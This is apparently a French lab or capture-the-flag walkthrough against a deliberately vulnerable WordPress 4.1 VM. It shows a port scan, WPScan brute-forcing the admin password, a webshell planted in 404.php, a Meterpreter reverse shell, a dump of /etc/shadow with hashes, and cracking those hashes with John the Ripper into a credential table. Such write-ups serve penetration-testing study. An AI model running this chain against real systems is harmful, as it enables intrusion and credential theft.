1.Énumération

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo sh massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] Scan IP: 192.168.56.150
[i] Rate: 1000
 
[+] Scan Masscan 192.168.56.150...100%
[+] Scan Nmap 192.168.56.150...100%
 
[+] 80/tcp open
[+] 443/tcp open
[+] 8080/tcp open
 
==========================================================
|                         Rapports                       |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.150-tcp.html     |
==========================================================
```

&nbsp;

**<span style="color: #dddddd;">💯</span> WPScan**

Crack du mot de passe admin du `wordpress`

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $wpscan --url http://192.168.56.164:8080/wordpress --passwords ~/Desktop/rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.56.164:8080/wordpress/ [192.168.56.164]
[+] Started: Sun Mar 16 15:33:49 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Powered-By: PHP/5.4.35
 |  - X-Mod-Pagespeed: 1.7.30.4-
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.56.164:8080/wordpress/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.56.164:8080/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.56.164:8080/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1 identified (Insecure, released on 2014-12-18).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.56.164:8080/wordpress/feed/, <generator>http://wordpress.org/?v=4.1</generator>
 |  - http://192.168.56.164:8080/wordpress/comments/feed/, <generator>http://wordpress.org/?v=4.1</generator>
 |  - http://192.168.56.164:8080/wordpress/sample-page/feed/, <generator>http://wordpress.org/?v=4.1</generator>

[+] WordPress theme in use: twentythirteen
 | Location: http://192.168.56.164:8080/wordpress/wp-content/themes/twentythirteen/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | [!] The version is out of date, the latest version is 4.3
 | Style URL: http://192.168.56.164:8080/wordpress/wp-content/themes/twentythirteen/style.css?ver=2013-07-18
 | Style Name: Twenty Thirteen
 | Style URI: http://wordpress.org/themes/twentythirteen
 | Description: The 2013 theme for WordPress takes us back to the blog, featuring a full range of post formats, each...
 | Author: the WordPress team
 | Author URI: http://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.56.164:8080/wordpress/wp-content/themes/twentythirteen/style.css?ver=2013-07-18, Match: 'Version: 1.4'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] all-in-one-seo-pack
 | Location: http://192.168.56.164:8080/wordpress/wp-content/plugins/all-in-one-seo-pack/
 | Last Updated: 2025-03-04T14:11:00.000Z
 | [!] The version is out of date, the latest version is 4.8.0
 |
 | Found By: Comment (Passive Detection)
 |
 | Version: 2.2.5.1 (60% confidence)
 | Found By: Comment (Passive Detection)
 |  - http://192.168.56.164:8080/wordpress/, Match: 'All in One SEO Pack 2.2.5.1 by'

[+] cart66-lite
 | Location: http://192.168.56.164:8080/wordpress/wp-content/plugins/cart66-lite/
 | Last Updated: 2016-01-27T21:11:00.000Z
 | [!] The version is out of date, the latest version is 1.5.8
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.5.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.56.164:8080/wordpress/wp-content/plugins/cart66-lite/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.56.164:8080/wordpress/wp-content/plugins/cart66-lite/readme.txt

[+] contact-form-7
 | Location: http://192.168.56.164:8080/wordpress/wp-content/plugins/contact-form-7/
 | Last Updated: 2025-03-11T08:37:00.000Z
 | [!] The version is out of date, the latest version is 6.0.5
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 4.1 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://192.168.56.164:8080/wordpress/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=4.1
 |  - http://192.168.56.164:8080/wordpress/wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=4.1
 | Confirmed By:
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.56.164:8080/wordpress/wp-content/plugins/contact-form-7/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.56.164:8080/wordpress/wp-content/plugins/contact-form-7/readme.txt

[+] proplayer
 | Location: http://192.168.56.164:8080/wordpress/wp-content/plugins/proplayer/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 4.7.9.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.56.164:8080/wordpress/wp-content/plugins/proplayer/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:04 <===============================================================================================================> (137 / 137) 100.00% Time: 00:00:04

[i] No Config Backups Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Performing password attack on Xmlrpc Multicall against 1 user/s
[SUCCESS] - admin / SuperSecretPassword                                                                                                                                                       
All Found                                                                                                                                                                                     
Progress Time: 00:00:03 <                                                                                                                                  > (1 / 28688)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: SuperSecretPassword

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Mar 16 15:34:10 2025
[+] Requests Done: 152
[+] Cached Requests: 61
[+] Data Sent: 191.189 KB
[+] Data Received: 168.812 KB
[+] Memory used: 288.492 MB
[+] Elapsed time: 00:00:21
```

&nbsp;

Avec les identifiant trouver précédemment j’ai pu injecter une `webshell` dans le code source de `404.php`

![Capture du 2025-03-16 15-43-57.png](../../_resources/Capture%20du%202025-03-16%2015-43-57.png)

&nbsp;

**<span style="color: #dddddd;">💥</span> Metasploit - webshell**

```
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
[*] Started reverse TCP handler on 192.168.56.149:4444 
[*] Sending stage (40004 bytes) to 192.168.56.164
[*] Meterpreter session 1 opened (192.168.56.149:4444 -> 192.168.56.164:45074) at 2025-03-16 15:42:03 +0100

(Meterpreter 1)(/opt/wordpress-4.1-0/apps/wordpress/htdocs) > 
```

&nbsp;

Dump des hash utilisateur

```
(Meterpreter 1)(/tmp) > cat /etc/shadow
root:$6$If.Y9A3d$L1/qOTmhdbImaWb40Wit6A/wP5tY5Ia0LB9HvZvl1xAGFKGP5hm9aqwvFtDIRKJaWkN8cuqF6wMvjl1gxtoR7/:16483:0:99999:7:::
daemon:*:16483:0:99999:7:::
bin:*:16483:0:99999:7:::
sys:*:16483:0:99999:7:::
sync:*:16483:0:99999:7:::
games:*:16483:0:99999:7:::
man:*:16483:0:99999:7:::
lp:*:16483:0:99999:7:::
mail:*:16483:0:99999:7:::
news:*:16483:0:99999:7:::
uucp:*:16483:0:99999:7:::
proxy:*:16483:0:99999:7:::
www-data:*:16483:0:99999:7:::
backup:*:16483:0:99999:7:::
list:*:16483:0:99999:7:::
irc:*:16483:0:99999:7:::
gnats:*:16483:0:99999:7:::
nobody:*:16483:0:99999:7:::
libuuid:!:16483:0:99999:7:::
syslog:*:16483:0:99999:7:::
messagebus:*:16483:0:99999:7:::
user:$6$MuqQZq4i$t/lNztnPTqUCvKeO/vvHd9nVe3yRoES5fEguxxHnOf3jR/zUl0SFs825OM4MuCWlV7H/k2QCKiZ3zso.31Kk31:16483:0:99999:7:::
mysql:!:16483:0:99999:7:::
candycane:$6$gfTgfe6A$pAMHjwh3aQV1lFXtuNDZVYyEqxLWd957MSFvPiPaP5ioh7tPOwK2TxsexorYiB0zTiQWaaBxwOCTRCIVykhRa/:16483:0:99999:7:::
# YOU STOLE MY PASSWORD FILE!
# SECRET = "NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!"
(Meterpreter 1)(/tmp) > 
```

&nbsp;

<span style="color: #dddddd;">🧨</span> **JohnTheRipper**

Crack des hash trouver

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $john candy 
Using default input encoding: UTF-8
Loaded 3 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
password            (candycane)
SuperSecretPassword (user)
SuperSecretPassword (root)    
1g 0:00:00:01 DONE 3/3 (2025-03-16 16:12) 0.5617g/s 1766p/s 1766c/s 1766C/s 123456..john
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $john hash --show   
candycane:password:16483:0:99999:7:::                                  
user:SuperSecretPassword:16483:0:99999:7:::
root:SuperSecretPassword:16483:0:99999:7:::

3 password hash cracked, 0 left
```

&nbsp;

Identifiant trouver

| Users | Passwords |
| --- | --- |
| root | SuperSecretPassword |
| user | SuperSecretPassword |
| candycane | password |